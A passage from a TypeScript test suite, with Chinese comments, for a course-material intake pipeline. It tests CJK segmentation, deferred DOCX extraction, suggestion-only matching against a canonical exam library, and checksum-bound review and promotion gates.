      env.dispose();
    }
  });

  it("中文分区标记必须被识别（`\\b` 对 CJK 失效 —— 实测踩到的静默缺陷）", async () => {
    const env = makeEnv();
    try {
      // 用 CJK PDF 承载中文标记。分段逻辑必须能识别 `参考译文`，
      // 否则中文原文与课程译文会被合并进同一个段（且不会有任何报错）。
      const sourceRoot = join(env.root, "src-cjk");
      writeSourceTree(
        sourceRoot,
        new Map([
          [
            "翻译/unit.pdf",
            buildCjkPdf([["翻译练习", FIXTURE_TRANSLATION_SOURCE], ["参考译文", FIXTURE_TRANSLATION_REFERENCE]]),
          ],
        ]),
      );
      const result = await runCourseIntake({
        sourceRoot,
        courseId: "cjk-course",
        provider: "test_fixture_provider",
        edition: null,
        title: "中文标记夹具",
        contentVersion: 1,
        provenance: { note: "合成夹具", reference: null, rightsNote: "合成夹具" },
        papersDir: env.papersDir,
      });

      const translation = result.archive.manifest.segments.find(
        (segment) => segment.kind === "translation_passage",
      );
      expect(translation).toBeDefined();
      // 关键断言：中文原文与课程译文**确实被分开**
      expect(translation!.text).toContain("城市人口");
      expect(translation!.text).not.toMatch(/[A-Za-z]{10,}/);
      expect(translation!.referenceTranslation).toMatch(/urban populations/i);
      expect(translation!.referenceTranslation).not.toContain("城市人口");
    } finally {
      env.dispose();
    }
  });

  it("把非 Latin-1 文本交给 Latin-1 PDF 构造器会**抛错**（防止夹具静默产出乱码）", () => {
    // 这是"夹具写错、测试却全绿"这一类缺陷的守护点：
    // 中文被单字节截断后会变成看似正常的乱码，而测试验证的是乱码。
    expect(() => buildTextPdf([["答案与解析"]])).toThrow(/Latin-1/);
    expect(() => buildTextPdf([["ok", "中文"]])).toThrow(/buildCjkPdf/);
    // 纯 Latin-1 正常构建
    expect(() => buildTextPdf([["Answer Keys"]])).not.toThrow();
  });

  it("唯一 DOCX（无 PDF 等价物）被登记但报 TEXT_EXTRACTION_DEFERRED，**不发明内容**", async () => {
    const env = makeEnv();
    try {
      const sourceRoot = join(env.root, "docx-only");
      writeSourceTree(
        sourceRoot,
        new Map([["写作/writing-template.docx", buildMinimalDocx("only a docx exists")]]),
      );
      const result = await runCourseIntake({
        sourceRoot,
        courseId: "docx-only",
        provider: "test_fixture_provider",
        edition: null,
        title: "仅 DOCX 夹具",
        contentVersion: 1,
        provenance: { note: "合成夹具", reference: null, rightsNote: "合成夹具" },
        papersDir: env.papersDir,
      });

      // 资产被登记
      expect(result.inventory.assets).toHaveLength(1);
      expect(result.inventory.assets[0].kind).toBe("docx");
      expect(result.inventory.assets[0].contentParsed).toBe(false);

      // 抽取被**如实推迟**，且没有产出任何文本
      const doc = result.documents[0];
      expect(doc.state).toBe("deferred");
      expect(doc.deferredMarker).toBe("TEXT_EXTRACTION_DEFERRED");
      expect(doc.pages).toEqual([]);

      // 没有任何段（凭空造内容是被禁止的）
      expect(result.archive.manifest.segments).toHaveLength(0);

      // 而"推迟"必须作为复核事项可见
      expect(
        result.archive.review.some((item) => item.code === "text_extraction_deferred"),
      ).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("extractSegmentsForMaterial：没有可解析内容时返回空段 + 说明（不是异常）", () => {
    // 直接调用单材料分段入口，验证"无内容 ⇒ 不产出段"这条契约
    const result = extractSegmentsForMaterial({
      proposal: {
        id: "material-docx-only",
        title: "仅 DOCX 的材料",
        normalizedStem: "docx-only",
        folderContext: "写作",
        moduleHint: "writing",
        representations: [
          { assetKey: "a1", sourceRelativePath: "写作/t.docx", kind: "docx", label: "DOCX 版（本版本不解析文本）" },
        ],
        basis: ["归一化文件名相同"],
        evidence: {
          sameNormalizedStem: true,
          sameFolderContext: true,
          kinds: ["docx"],
          contentComparable: false,
          textContainment: null,
        },
        ambiguous: false,
        ambiguityReason: null,
        reviewRequired: false,
        reviewNotes: [],
      },
      documents: [
        {
          assetKey: "a1",
          state: "deferred",
          pages: [],
          tool: null,
          pagesWithoutTextLayer: [],
          warnings: [],
          error: null,
          deferredMarker: "TEXT_EXTRACTION_DEFERRED",
        },
      ],
    });

    expect(result.segments).toEqual([]);
    expect(result.warnings.join(" ")).toMatch(/TEXT_EXTRACTION_DEFERRED/);
    expect(result.anomalies.some((anomaly) => anomaly.detail.includes("TEXT_EXTRACTION_DEFERRED"))).toBe(true);
  });

  it("imageOnlyPdfFixture 场景：无文本层 PDF 在**完整链路**上产出 0 段且阻断", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, imageOnlyPdfFixture());
      // 不 OCR、不发明内容 ⇒ 没有段
      expect(result.archive.manifest.segments).toHaveLength(0);
      // 但必须有一条**阻断级**事项，否则"没抽到文本"会被静默忽略
      expect(
        result.archive.review.some(
          (item) => item.code === "page_without_text_layer" && item.severity === "blocking",
        ),
      ).toBe(true);
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// 匹配
// ===========================================================================

describe("MATCHING —— 只产建议，永不是核验", () => {
  const paper = {
    paperId: "fixture-paper",
    content: null as never,
    checksum: "c".repeat(64),
  };

  function makeIndex() {
    const fixture = buildFixturePackage({ id: "fixture-paper", contentVersion: 1 });
    const manifest = fixture.manifest as unknown as Parameters<typeof buildCanonicalIndex>[0][number]["content"];
    return buildCanonicalIndex([{ ...paper, content: manifest }]);
  }

  function segment(overrides: Partial<Parameters<typeof matchSegments>[0][number]> = {}) {
    return {
      id: "seg-1",
      materialProposalId: "material-1",
      kind: "reading_passage" as const,
      order: 0,
      title: "测试段",
      representationAssetKey: "asset-1",
      anchor: { pageStart: 1, pageEnd: 1, quote: null },
      audioAssetKey: null,
      text: FIXTURE_PASSAGE_A,
      transcript: null,
      referenceTranslation: null,
      notes: null,
      evidence: {
        cues: ["Passage One"],
        lineSpan: "p1:1–p1:5",
        observedQuestionNumbers: [] as number[],
        folderLabelOnly: false,
      },
      reviewRequired: false,
      reviewNotes: [],
      anomalies: [],
      ...overrides,
    };
  }

  it("分块：每类段只与可比的大题比较；写作/方法**默认不匹配**", () => {
    expect(ALLOWED_SECTION_TYPES.writing_template).toBeNull();
    expect(ALLOWED_SECTION_TYPES.method_note).toBeNull();
    expect(ALLOWED_SECTION_TYPES.reading_passage).toEqual([
      "reading.careful_reading",
      "reading.matching",
      "reading.banked_cloze",
    ]);
    expect(ALLOWED_SECTION_TYPES.listening_conversation).toEqual(["listening.long_conversation"]);
    expect(ALLOWED_SECTION_TYPES.listening_recording).toEqual(["listening.talk_report_lecture"]);
    expect(ALLOWED_SECTION_TYPES.translation_passage).toEqual(["translation"]);
  });

  it("method_note / writing_template 产生 **no_candidate**（按设计）", () => {
    const index = makeIndex();
    for (const kind of ["method_note", "writing_template"] as const) {
      const result = matchSegments([segment({ kind })], index);
      expect(result.segments[0].label).toBe("no_candidate");
      expect(result.segments[0].suggestions).toHaveLength(0);
      expect(result.segments[0].blocking.candidatesConsidered).toBe(0);
      expect(result.segments[0].unmatchedNote).toMatch(/不参与 canonical 匹配|设计/);
    }
  });

  it("canonical 库为空 ⇒ 未匹配，且是**合法**状态（不是失败）", () => {
    const empty = buildCanonicalIndex([]);
    const result = matchSegments([segment()], empty);
    expect(result.segments[0].label).toBe("no_candidate");
    expect(result.segments[0].unmatchedNote).toMatch(/未匹配是合法状态|合法/);
    // 语义必须正确：未匹配 ≠ 材料是伪造的
    expect(result.segments[0].unmatchedNote).toMatch(/不\*\*意味着|不意味着/);
  });

  it("**文件名 / 套别号 / 题号** 单独存在时**不产生**任何匹配", () => {
    const index = makeIndex();
    // 段内容与任何 canonical 篇章都无关，但：文件名"很像"、有题号、有套别号
    const unrelated = segment({
      text: "This is a completely unrelated synthetic paragraph about municipal waste collection schedules.",
      evidence: {
        cues: ["Passage One"],
        lineSpan: "p1:1–p1:2",
        observedQuestionNumbers: [46, 47, 48, 49, 50],
        folderLabelOnly: false,
      },
    });
    const result = matchSegments([unrelated], index, {
      courseFileName: "2024年12月第一套阅读.pdf",
      courseSetLabel: "第一套",
      courseAnswerKey: "46.A 47.B",
    });
    // 这些线索**只**出现在 contextOnly 里，绝不参与打分
    for (const suggestion of result.segments[0].suggestions) {
      expect(suggestion.evidence.contextOnly.courseFileName).toBe("2024年12月第一套阅读.pdf");
      expect(suggestion.evidence.contextOnly.courseSetLabel).toBe("第一套");
    }
    // 若产生了建议，其分数必须**只**来自内容证据（此段内容与库无关 ⇒ 分数极低或没有）
    const top = result.segments[0].suggestions[0];
    if (top) {
      expect(top.evidence.bodyContainment).toBeLessThan(0.2);
      expect(top.evidence.projectionExact).toBe(false);
    }
  });

  it("课程答案分歧**不改变** canonical 身份（答案不是身份证据）", () => {
    const index = makeIndex();
    const withAnswerA = matchSegments([segment()], index, {
      courseFileName: null,
      courseSetLabel: null,
      courseAnswerKey: "46.A 47.B 48.C",
    });
    const withAnswerB = matchSegments([segment()], index, {
      courseFileName: null,
      courseSetLabel: null,
      courseAnswerKey: "46.D 47.D 48.D",
    });
    // 分数必须完全相同：课程答案不参与打分
    const scoresA = withAnswerA.segments[0].suggestions.map((s) => s.score);
    const scoresB = withAnswerB.segments[0].suggestions.map((s) => s.score);
    expect(scoresA).toEqual(scoresB);
  });

  it("精确指纹给出最强证据项，但**仍然不是** verified", () => {
    const index = makeIndex();
    // 用库里**实际**的篇章内容构造段 ⇒ 投影精确相同。
    // 取 body 最长的那一组（夹具的篇章很短，因此不能靠固定长度阈值去找）。
    const withSubstance = index.groups
      .filter((group) => group.bodyShingles !== null)
      .sort((a, b) => b.body.length - a.body.length);
    expect(withSubstance.length).toBeGreaterThan(0);
    const canonicalBody = withSubstance[0].body;

    const result = matchSegments([segment({ text: canonicalBody })], index);
    const top = result.segments[0].suggestions[0];
    expect(top).toBeDefined();
    expect(top.evidence.projectionExact).toBe(true);
    expect(top.label).toBe("strong_candidate");
    // 标签体系里**不存在** verified
    for (const suggestion of result.segments[0].suggestions) {
      expect(suggestion.label).not.toBe("verified");
    }
  });

  it("每条建议都带完整逐项证据分解（无不可解释的总分）", () => {
    const index = makeIndex();
    const result = matchSegments([segment()], index);
    for (const suggestion of result.segments[0].suggestions) {
      const evidence = suggestion.evidence;
      expect(typeof evidence.projectionExact).toBe("boolean");
      expect(typeof evidence.bodyContainment).toBe("number");
      expect(typeof evidence.bodyJaccard).toBe("number");
      expect(typeof evidence.structuralConsistency).toBe("number");
      expect(evidence.stemOverlap === null || typeof evidence.stemOverlap === "number").toBe(true);
      expect(evidence.optionOverlap === null || typeof evidence.optionOverlap === "number").toBe(true);
      // 上下文线索结构必须存在
      expect(evidence.contextOnly).toBeDefined();
      // 分数必须是这些项的函数（可复算）
      expect(scoreOf(evidence)).toBeCloseTo(suggestion.score, 5);
    }
  });

  it("歧义：前两名分数过于接近 ⇒ ambiguous，且**不选**排第一的", () => {
    const index = makeIndex();
    // 构造一个与库中两个篇章都高度相似的段（复制所有篇章）
    const body = index.groups
      .filter((group) => group.body.length > 100)
      .map((group) => group.body)
      .join("\n");
    const result = matchSegments([segment({ text: body })], index, {
      courseFileName: null,
      courseSetLabel: null,
      courseAnswerKey: null,
    });
    const entry = result.segments[0];
    if (entry.suggestions.length >= 2) {
      const gap = entry.suggestions[0].score - entry.suggestions[1].score;
      if (gap < AMBIGUITY_SCORE_GAP) {
        expect(entry.ambiguous).toBe(true);
        expect(entry.ambiguityNote).toMatch(/不得|人工裁决/);
      }
    }
    // 无论如何：歧义时不得"自动选定"
    if (entry.ambiguous) {
      expect(entry.ambiguityNote).not.toBeNull();
    }
  });

  it("标签阈值与权重的行为（score → label）", () => {
    expect(labelFor(0.9)).toBe("strong_candidate");
    expect(labelFor(0.5)).toBe("possible_candidate");
    expect(labelFor(0.25)).toBe("weak_candidate");
    expect(labelFor(0.0)).toBe("no_candidate");
    // 权重之和用于归一化，因此总分在 0–1
    const total = Object.values(MATCH_WEIGHTS).reduce((sum, value) => sum + value, 0);
    expect(total).toBeCloseTo(1, 5);
  });

  it("canonical 库摘要对库内容敏感（库变 ⇒ 摘要变 ⇒ 匹配陈旧可达）", () => {
    const a = canonicalLibraryDigest([
      { paperId: "p1", contentVersion: 1, manifestChecksum: "a".repeat(64), targetCount: 3 },
    ]);
    const b = canonicalLibraryDigest([
      { paperId: "p1", contentVersion: 1, manifestChecksum: "a".repeat(64), targetCount: 3 },
      { paperId: "p2", contentVersion: 1, manifestChecksum: "b".repeat(64), targetCount: 2 },
    ]);
    const c = canonicalLibraryDigest([
      { paperId: "p1", contentVersion: 2, manifestChecksum: "a".repeat(64), targetCount: 3 },
    ]);
    expect(a).not.toBe(b);
    expect(a).not.toBe(c);
    // 顺序无关
    const reordered = canonicalLibraryDigest([
      { paperId: "p2", contentVersion: 1, manifestChecksum: "b".repeat(64), targetCount: 2 },
      { paperId: "p1", contentVersion: 1, manifestChecksum: "a".repeat(64), targetCount: 3 },
    ]);
    expect(reordered).toBe(b);
  });
});

// ===========================================================================
// 匹配投影
// ===========================================================================

describe("匹配投影 —— 只用于相似度，绝不改存储文本", () => {
  it("NFKC / 大小写 / 排版引号 / 破折号 / 空白被归一", () => {
    expect(projectForMatching("ＡＢＣ")).toBe("abc");
    expect(projectForMatching("Passage  ONE")).toBe("passage one");
    expect(projectForMatching("it’s")).toBe("it's");
    expect(projectForMatching("a“b”c")).toBe('a"b"c');
    expect(projectForMatching("a—b")).toBe("a-b");
    expect(projectForMatching("a\n\nb")).toBe("a b");
  });

  it("行尾连字符被拆除（PDF 断行伪影），但词内连字符保留", () => {
    expect(projectForMatching("informa-\ntion")).toBe("information");
    // 真实连字符词不受影响
    expect(projectForMatching("well-known")).toBe("well-known");
  });

  it("Jaccard vs containment 的差异（长文本里 containment 才是对的判据）", () => {
    const short = "the quick brown fox jumps over the lazy dog and runs away swiftly";
    const long = `${short} ${FIXTURE_PASSAGE_A} ${FIXTURE_PASSAGE_B}`;
    const a = shingles(short);
    const b = shingles(long);
    // 短的完全被长的包含 ⇒ containment 接近 1
    expect(containment(a, b)).toBeCloseTo(1, 5);
    // 但 Jaccard 被长度差稀释得很低
    expect(jaccard(a, b)).toBeLessThan(0.5);
  });

  it("最小体量闸门：极短文本不产生相似度", () => {
    expect(hasEnoughSubstance("the")).toBe(false);
    expect(hasEnoughSubstance(FIXTURE_PASSAGE_A)).toBe(true);
  });

  it("CJK 用字符 bigram、拉丁用词级 trigram（语系分别处理）", () => {
    const cjk = shingles("中国的城市化进程");
    expect(cjk.size).toBeGreaterThan(3);
    expect([...cjk].every((item) => item.startsWith("cjk:"))).toBe(true);

    const latin = shingles("the quick brown fox jumps");
    expect([...latin].every((item) => item.startsWith("w:"))).toBe(true);
  });

  it("scriptProfile 如实反映语系构成（用于翻译段判据）", () => {
    expect(scriptProfile(FIXTURE_TRANSLATION_SOURCE).cjkRatio).toBeGreaterThan(0.8);
    expect(scriptProfile(FIXTURE_TRANSLATION_REFERENCE).cjkRatio).toBe(0);
  });

  it("tokenSet 覆盖中英文（题干/选项重叠的判据）", () => {
    const tokens = tokenSet("What did early researchers assume about attention?");
    expect(tokens.has("w:researchers")).toBe(true);
    const cjkTokens = tokenSet("注意力");
    expect([...cjkTokens].some((item) => item.startsWith("c:"))).toBe(true);
  });

  it("投影是纯函数且确定性（同一输入同一输出）", () => {
    const text = "Ａ Passage—with ’quotes’ and\nline breaks";
    expect(projectForMatching(text)).toBe(projectForMatching(text));
  });
});

// ===========================================================================
// 复核与晋升
// ===========================================================================

describe("REVIEW / PROMOTION —— 绑定、陈旧、失败关闭", () => {
  it("候选的 course.json **必须**通过生产校验器（否则晋升必然失败关闭）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, fullCourseFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);

      const production = validateWithProduction(dir, "test-course");
      expect(production.ok).toBe(true);
      expect(production.issues).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("manifest 字段名是磁盘契约 `path`（不是内存模型的 relativePath）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const raw = result.archive.files.get("course.json")!.toString("utf8");
      const parsed = JSON.parse(raw) as { assets: Record<string, unknown>[] };
      for (const asset of parsed.assets) {
        expect(typeof asset.path).toBe("string");
        expect(asset.relativePath).toBeUndefined();
      }
      // 而且它就是内存模型的 relativePath 值（只是改了字段名）
      expect(parsed.assets[0].path).toBe(result.archive.manifest.assets[0].relativePath);
    } finally {
      env.dispose();
    }
  });

  it("生成的 course.json 能通过 zod 形状 + 语义校验", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, fullCourseFixture());
      const manifest = JSON.parse(result.archive.files.get("course.json")!.toString("utf8"));
      const outcome = validateCourseManifest(manifest);
      expect(outcome.issues).toEqual([]);
      expect(outcome.ok).toBe(true);
      expect(outcome.course?.schemaVersion).toBe(COURSE_MANIFEST_SCHEMA_VERSION);
    } finally {
      env.dispose();
    }
  });

  it("没有 review ⇒ 不可晋升（工具从不生成它）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const gate = gateFor(env, stored, null, [], stored.metadata.matching.canonicalLibrary.digest);
      expect(gate.status).not.toBe("PROMOTABLE");
      expect(gate.checks.find((check) => check.name === "human_review_present")?.passed).toBe(false);
      expect(gate.summary).toMatch(/没有复核记录|review\.json/);
    } finally {
      env.dispose();
    }
  });

  it("candidateChecksum 精确匹配才通过（不匹配即陈旧）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);

      const stored = readStoredCandidate("test-course", env.candidatesDir);

      // 错误校验和
      writeReview(env, "test-course", { candidateChecksum: "f".repeat(64) });
      const badRaw = JSON.parse(readFileSync(join(dir, "review.json"), "utf8"));
      const badParsed = validateCourseReviewFile(badRaw);
      const badGate = gateFor(env, stored, badParsed.file, badParsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      expect(
        badGate.checks.find((check) => check.name === "review_bound_to_current_candidate")?.passed,
      ).toBe(false);
      expect(badGate.status).not.toBe("PROMOTABLE");

      // 正确校验和 → 该项必须通过
      writeReview(env, "test-course");
      const goodRaw = JSON.parse(readFileSync(join(dir, "review.json"), "utf8"));
      const goodParsed = validateCourseReviewFile(goodRaw);
      const goodGate = gateFor(env, stored, goodParsed.file, goodParsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      expect(
        goodGate.checks.find((check) => check.name === "review_bound_to_current_candidate")?.passed,
      ).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("候选被改动（course.json 变）⇒ 复核陈旧", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      writeReview(env, "test-course");

      // 改动 course.json（模拟候选内容被改）
      const coursePath = join(dir, "course.json");
      const manifest = JSON.parse(readFileSync(coursePath, "utf8"));
      manifest.title = "被改过的标题";
      writeFileSync(coursePath, `${JSON.stringify(manifest, null, 2)}\n`, "utf8");

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const reviewRaw = JSON.parse(readFileSync(join(dir, "review.json"), "utf8"));
      const parsed = validateCourseReviewFile(reviewRaw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      const bound = gate.checks.find((check) => check.name === "review_bound_to_current_candidate");
      expect(bound?.passed).toBe(false);
      expect(bound?.detail).toMatch(/陈旧/);
    } finally {
      env.dispose();
    }
  });

  it("canonical 库变化 ⇒ 匹配证据陈旧（旧分数不得沿用）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture(), { withPapers: true });
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      writeReview(env, "test-course");

      // 往库里加一份真题 ⇒ 库摘要变化
      writeFixturePackage(env.contentRoot, "fixture-paper-2", buildFixturePackage({ id: "fixture-paper-2" }));

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const { buildIndexFromDisk } = await import("@/content/course-pipeline/canonical");
      const current = buildIndexFromDisk(env.papersDir);
      const reviewRaw = JSON.parse(readFileSync(join(dir, "review.json"), "utf8"));
      const parsed = validateCourseReviewFile(reviewRaw);

      const gate = gateFor(env, stored, parsed.file, parsed.errors, current.index.summary.digest);
      const libraryCheck = gate.checks.find(
        (check) => check.name === "canonical_library_unchanged_since_review",
      );
      expect(libraryCheck?.passed).toBe(false);
      expect(gate.status).not.toBe("PROMOTABLE");
    } finally {
      env.dispose();
    }
  });

  it("review.json 形状非法 ⇒ 明确拒绝（缺 candidateChecksum / 缺 evidence 等）", () => {
    expect(validateCourseReviewFile(null).ok).toBe(false);
    expect(validateCourseReviewFile({}).ok).toBe(false);

    // 缺 candidateChecksum（undefined ≠ null）
    const missing = validateCourseReviewFile({
      courseId: "c",
      reviewer: "r",
      reviewedAt: "2026-01-01",
      canonicalLibraryDigest: "d",
      materialGroupings: [],
      segments: [],
      matches: [],
      verifiedScope: ["x"],
      notVerified: [],
    });
    expect(missing.ok).toBe(false);
    expect(missing.errors.join(" ")).toMatch(/candidateChecksum 缺失/);

    // 显式 null 是**合法形状**（但门禁必然因此不通过）
    const explicitNull = validateCourseReviewFile({
      courseId: "c",
      reviewer: "r",
      reviewedAt: "2026-01-01",
      candidateChecksum: null,
      canonicalLibraryDigest: "d",
      materialGroupings: [],
      segments: [],
      matches: [],
      verifiedScope: ["x"],
      notVerified: [],
    });
    expect(explicitNull.ok).toBe(true);

    // reviewedAt 必须 YYYY-MM-DD
    const badDate = validateCourseReviewFile({
      courseId: "c",
      reviewer: "r",
      reviewedAt: "2026/01/01",
      candidateChecksum: "a".repeat(64),
      canonicalLibraryDigest: "d",
      materialGroupings: [],
      segments: [],
      matches: [],
      verifiedScope: ["x"],
      notVerified: [],
    });
    expect(badDate.ok).toBe(false);

    // 接受建议必须指向具体目标
    const noTarget = validateCourseReviewFile({
      courseId: "c",
      reviewer: "r",
      reviewedAt: "2026-01-01",
      candidateChecksum: "a".repeat(64),
      canonicalLibraryDigest: "d",
      materialGroupings: [],
      segments: [],
      matches: [
        {
          segmentId: "s1",
          disposition: "accepted_suggestion",
          paperId: null,
          targetScope: null,
          sectionId: null,
          groupId: null,
          questionId: null,
          note: "n",
          evidence: "足够长的证据说明文本",
        },
      ],
      verifiedScope: ["x"],
      notVerified: [],
    });
    expect(noTarget.ok).toBe(false);
    expect(noTarget.errors.join(" ")).toMatch(/paperId 缺失/);
  });

  it("歧义匹配若未被处置 ⇒ 门禁不通过（不得默认选第一名）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture(), { withPapers: true });
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      // 构造一份"没有任何匹配裁决"的 review（歧义未处置）
      const raw = {
        courseId: "test-course",
        reviewer: "vitest",
        reviewedAt: "2026-01-01",
        candidateChecksum: stored.recomputed.candidateChecksum,
        canonicalLibraryDigest: stored.metadata.matching.canonicalLibrary.digest,
        materialGroupings: stored.metadata.grouping.proposals
          .filter((proposal) => proposal.reviewRequired)
          .map((proposal) => ({
            proposalId: proposal.id,
            decision: "accepted",
            note: "n",
            evidence: "足够长的证据说明文本内容",
          })),
        segments: stored.metadata.segmentation.materials
          .flatMap((material) => material.segments)
          .filter((segment) => segment.reviewRequired)
          .map((segment) => ({
            segmentId: segment.id,
            decision: "accepted",
            note: "n",
            evidence: "足够长的证据说明文本内容",
          })),
        matches: [],
        verifiedScope: ["x"],
        notVerified: [],
      };
      writeFileSync(join(dir, "review.json"), JSON.stringify(raw, null, 2), "utf8");

      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      const ambiguousCheck = gate.checks.find((check) => check.name === "ambiguous_matches_dispositioned");
      const ambiguousSegments = stored.metadata.matching.segments.filter((segment) => segment.ambiguous);
      if (ambiguousSegments.length > 0) {
        expect(ambiguousCheck?.passed).toBe(false);
      }
      // 无论是否有歧义，这条检查都必须报出结论
      expect(ambiguousCheck).toBeDefined();
    } finally {
      env.dispose();
    }
  });

  it("裁决引用不存在的段/提案 ⇒ 门禁 BLOCKED（复核与候选不匹配）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const raw = {
        courseId: "test-course",
        reviewer: "vitest",
        reviewedAt: "2026-01-01",
        candidateChecksum: stored.recomputed.candidateChecksum,
        canonicalLibraryDigest: stored.metadata.matching.canonicalLibrary.digest,
        materialGroupings: [
          { proposalId: "不存在的提案", decision: "accepted", note: "n", evidence: "足够长的证据说明文本" },
        ],
        segments: [
          { segmentId: "不存在的段", decision: "accepted", note: "n", evidence: "足够长的证据说明文本" },
        ],
        matches: [],
        verifiedScope: ["x"],
        notVerified: [],
      };
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      expect(
        gate.checks.find((check) => check.name === "grouping_decisions_reference_real_proposals")?.passed,
      ).toBe(false);
      expect(
        gate.checks.find((check) => check.name === "segment_decisions_reference_real_segments")?.passed,
      ).toBe(false);
      // 这两项属于**硬**失败 ⇒ BLOCKED（不是"人还没决定完"）
      expect(gate.status).toBe("BLOCKED");
    } finally {
      env.dispose();
    }
  });

  it("被排除的段（F9）⇒ 门禁判**不可晋升**，并提示重新生成候选", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const someSegment = stored.metadata.segmentation.materials[0].segments[0];
      const raw = {
        courseId: "test-course",
        reviewer: "vitest",
        reviewedAt: "2026-01-01",
        candidateChecksum: stored.recomputed.candidateChecksum,
        canonicalLibraryDigest: stored.metadata.matching.canonicalLibrary.digest,
        materialGroupings: [],
        segments: [
          {
            segmentId: someSegment.id,
            decision: "excluded",
            note: "n",
            evidence: "足够长的证据说明文本内容",
          },
        ],
        matches: [],
        verifiedScope: ["x"],
        notVerified: [],
      };
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);

      // F9-B：`excluded` 的语义是"当前候选不可晋升"（晋升会原样复制该段）
      const check = gate.checks.find((c) => c.name === "excluded_segments_block_promotion");
      expect(check).toBeDefined();
      expect(check?.passed).toBe(false);
      expect(gate.status).toBe("BLOCKED");
      // 必须给出处置方向，而不是让人去改复核记录
      expect(check?.detail).toMatch(/重新生成候选|course:extract/);
    } finally {
      env.dispose();
    }
  });

  it("资产校验：字节数或校验和不符 ⇒ 失败关闭", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      const stored = readStoredCandidate("test-course", env.candidatesDir);

      expect(checkCandidateAssets(dir, stored.metadata).ok).toBe(true);

      // 篡改一个资产的字节
      const assetPath = join(dir, result.archive.manifest.assets[0].relativePath);
      writeFileSync(assetPath, Buffer.from("%PDF-1.4\ntampered content\n%%EOF\n", "utf8"));

      const check = checkCandidateAssets(dir, stored.metadata);
      expect(check.ok).toBe(false);
      expect(check.issues.join(" ")).toMatch(/字节数不符|校验和不符/);
    } finally {
      env.dispose();
    }
  });

  it("候选目录**从未**被生产课程导入器发现", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);

      // 生产导入器只枚举 courses/*
      const importer = new NormalizedCourseImporter(env.coursesDir);
      expect(importer.discover()).toHaveLength(0);
      // 而候选目录确实存在（它不是"不存在"，而是"不被发现"）
      expect(readFileSync(join(dir, "course.json"), "utf8")).toContain("test-course");
    } finally {
      env.dispose();
    }
  });

  it("晋升：只复制 course.json 与 assets/，**不泄漏**候选/复核元数据", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      writeReview(env, "test-course");

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const parsed = validateCourseReviewFile(
        JSON.parse(readFileSync(join(dir, "review.json"), "utf8")),
      );
